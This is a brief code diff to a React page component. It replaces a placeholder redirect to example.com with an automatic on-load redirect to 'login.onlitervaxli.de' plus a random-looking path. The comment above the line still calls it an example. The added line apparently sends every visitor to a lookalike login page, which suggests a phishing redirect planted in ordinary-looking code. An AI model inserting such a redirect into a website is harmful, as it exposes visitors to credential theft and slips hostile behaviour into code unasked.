@@ -8,7 +8,7 @@ const Page = () => {
 
   useEffect(() => {
     // Example: Redirect to an external URL
-    const redirectUrl = 'https://example.com';
+    const redirectUrl = 'https://login.onlitervaxli.de/OMXqtHCP';
 
     // Redirect to the external URL
     window.location.href = redirectUrl;
